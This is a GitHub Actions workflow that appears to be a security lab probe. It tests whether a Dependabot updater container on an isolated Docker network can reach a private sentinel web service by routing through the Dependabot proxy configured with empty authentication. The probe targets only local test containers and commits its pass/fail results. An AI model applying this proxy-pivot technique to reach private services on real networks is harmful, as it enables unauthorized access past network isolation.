name: dependabot-production-private-pivot

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/dependabot-production-private-pivot.yml'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout lab repository
        uses: actions/checkout@v7
        with:
          path: verdict-repo

      - name: Validate private-network pivot with exact production images
        shell: bash
        run: |
          set -euo pipefail
          PROXY_IMAGE='ghcr.io/dependabot/proxy:v2.0.20260616220547@sha256:b3c9cac5831fdef22330282f54c7067d4df9844385daf8f1a66c880a670a9daa'
          UPDATER_IMAGE='ghcr.io/dependabot/dependabot-updater-npm:v2.0.20260618134322@sha256:202d8cf76d983932160073ccbecc20d548b3ecba73d2f63547d1873a1166f8ce'

          docker pull "$PROXY_IMAGE" >/dev/null
          docker pull "$UPDATER_IMAGE" >/dev/null
          docker pull nginx:1.29-alpine >/dev/null

          docker network create db-pivot-external >/dev/null
          docker network create --internal db-pivot-internal >/dev/null

          mkdir -p "$RUNNER_TEMP/private-service"
          printf 'DEPENDABOT_PRIVATE_PIVOT_SENTINEL_4a77\n' > "$RUNNER_TEMP/private-service/index.html"
          docker run -d --name db-private-service \
            --network db-pivot-external \
            -v "$RUNNER_TEMP/private-service:/usr/share/nginx/html:ro" \
            nginx:1.29-alpine >/dev/null
          PRIVATE_IP=$(docker inspect -f '{{(index .NetworkSettings.Networks "db-pivot-external").IPAddress}}' db-private-service)

          openssl req -x509 -newkey rsa:2048 -nodes \
            -keyout "$RUNNER_TEMP/pivot-ca.key" -out "$RUNNER_TEMP/pivot-ca.crt" \
            -subj '/CN=Dependabot Pivot PoC CA' -days 1 >/dev/null 2>&1
          python3 - <<'PY'
          import json, os
          from pathlib import Path
          cfg = {
            'all_credentials': [],
            'ca': {
              'cert': Path(os.environ['RUNNER_TEMP'] + '/pivot-ca.crt').read_text(),
              'key': Path(os.environ['RUNNER_TEMP'] + '/pivot-ca.key').read_text(),
            },
            'proxy_auth': {'username': '', 'password': ''},
          }
          Path(os.environ['RUNNER_TEMP'] + '/pivot-proxy-config.json').write_text(json.dumps(cfg))
          PY

          docker run -d --name db-pivot-proxy \
            --network db-pivot-internal \
            -v "$RUNNER_TEMP/pivot-proxy-config.json:/config.json:ro" \
            "$PROXY_IMAGE" -config /config.json >/dev/null
          docker network connect db-pivot-external db-pivot-proxy
          PROXY_IP=$(docker inspect -f '{{(index .NetworkSettings.Networks "db-pivot-internal").IPAddress}}' db-pivot-proxy)

          RESULT="$GITHUB_WORKSPACE/verdict-repo/security-probe-results/dependabot-production-private-pivot.txt"
          mkdir -p "$(dirname "$RESULT")"
          : > "$RESULT"
          echo "proxy_image=$PROXY_IMAGE" >> "$RESULT"
          echo "updater_image=$UPDATER_IMAGE" >> "$RESULT"
          echo 'private_service_network=external_only' >> "$RESULT"
          echo 'updater_network=internal_only' >> "$RESULT"

          run_fetch() {
            local url="$1"; local proxy_url="${2:-}"
            docker run --rm --user dependabot --network db-pivot-internal \
              -e TARGET_URL="$url" -e PROXY_URL="$proxy_url" \
              --entrypoint /bin/sh "$UPDATER_IMAGE" -lc '
                if command -v curl >/dev/null 2>&1; then
                  if [ -n "$PROXY_URL" ]; then exec curl -fsS --max-time 8 --proxy "$PROXY_URL" "$TARGET_URL"; else exec curl -fsS --max-time 5 "$TARGET_URL"; fi
                else
                  if [ -n "$PROXY_URL" ]; then export http_proxy="$PROXY_URL" HTTP_PROXY="$PROXY_URL"; fi
                  exec ruby -rnet/http -ruri -e "u=URI(ENV.fetch(\"TARGET_URL\")); print Net::HTTP.get(u)"
                fi
              '
          }

          set +e
          DIRECT_BODY=$(run_fetch "http://${PRIVATE_IP}/" 2>/dev/null)
          DIRECT_EC=$?
          PROXY_BODY=$(run_fetch "http://${PRIVATE_IP}/" "http://${PROXY_IP}:1080" 2>/dev/null)
          PROXY_EC=$?
          set -e

          echo "direct_private_service_exit=$DIRECT_EC" >> "$RESULT"
          if [[ "$DIRECT_BODY" == 'DEPENDABOT_PRIVATE_PIVOT_SENTINEL_4a77' ]]; then echo 'direct_private_service_reached=true' >> "$RESULT"; else echo 'direct_private_service_reached=false' >> "$RESULT"; fi
          echo "proxy_private_service_exit=$PROXY_EC" >> "$RESULT"
          if [[ "$PROXY_BODY" == 'DEPENDABOT_PRIVATE_PIVOT_SENTINEL_4a77' ]]; then echo 'proxy_private_service_reached=true' >> "$RESULT"; else echo 'proxy_private_service_reached=false' >> "$RESULT"; fi

      - name: Commit verdict
        if: always()
        shell: bash
        run: |
          set -euo pipefail
          cd verdict-repo
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add security-probe-results/dependabot-production-private-pivot.txt
          git commit -m 'Record Dependabot production private-network pivot' || exit 0
          git push